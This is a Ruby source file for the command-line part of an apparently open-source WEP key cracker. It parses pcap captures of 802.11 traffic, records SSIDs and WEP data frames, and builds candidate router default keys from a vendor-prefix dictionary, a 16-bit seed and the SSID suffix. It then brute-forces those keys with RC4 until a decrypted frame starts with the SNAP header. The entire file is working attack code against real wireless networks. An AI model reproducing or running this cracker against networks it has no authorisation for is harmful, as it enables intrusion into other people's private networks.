require 'eleventh/80211'
require 'eleventh/dictionary'
require 'eleventh/rc4'
require 'eleventh/pcap'
require 'active_support/all'

module Eleventh
  class CLI
    def initialize(filenames)
      @ssids, @data_frames = { }, { }

      filenames.each do |filename|
        puts "Reading #{File.basename(filename)}..."
        pcap = Pcap::File.read(File.open(filename))
        pcap.packets.each do |packet|
          frame = Frame.read(packet.data.snapshot)
          case frame.control_frame.type.to_i
            when 2
              # data
              subframe = WepFrame.read(frame.payload.snapshot)
              @data_frames[frame.addr2] ||= []
              @data_frames[frame.addr2] << subframe
            when 0
              case frame.control_frame.subtype.to_i
                # beacon, probe
                # 5: probe response
                when 4, 5, 8
                  begin
                    subframe = ManagementFrame.read(frame.payload.snapshot)
                    @ssids[frame.addr2] = subframe.ssid unless subframe.ssid.blank?
                  rescue
                    next # invalid frame
                  end
              end
          end
        end
      end

      puts "#{@data_frames.size} vulnerable networks found."
      @data_frames.each do |bssid, frames|
        ssid = @ssids[bssid] || bssid.to_s
        bruteforce(ssid, bssid, frames)
      end
    end

    protected

    SNAP_FRAME_HEADER = "\xAA\xAA\x03\x00\x00\x00"

    def bruteforce(ssid, bssid, frames)
      keys = keygen(ssid, bssid)
      return unless keys.any?

      puts "Cracking #{ssid} [#{bssid}] (#{frames.size} data frames found)"
      puts "  #{keys.size} possible known keys to test against."

      frames.each_with_index do |frame, frame_index|
        puts "  Cracking data frame ##{frame_index}"
        iv_string = frame.iv.to_binary_s
        snap_data = frame.data.to_binary_s.to(SNAP_FRAME_HEADER.size-1)

        start_time = Time.now.to_f
        keys.each do |key|
          if decrypt(snap_data, key, iv_string).start_with?(SNAP_FRAME_HEADER)
            end_time = "%0.2f" % (Time.now.to_f - start_time)
            puts "  Key found: #{key} (#{end_time}s)"
            return key
          end
        end
      end
    end

    def decrypt(data, key, iv)
      rc4 = RC4.new(iv + key)
      rc4.process(data)
    end

    def keygen(essid, bssid)
      suffix = essid[-2, 2]
      if prefixes = DICTIONARY[bssid.to_s.to(7)]
        prefixes.map { |prefix| (0..65535).map { |seed| [prefix, seed.to_s(16).rjust(4, "0").upcase, suffix].join } }.flatten
      else
        []
      end
    end
  end
end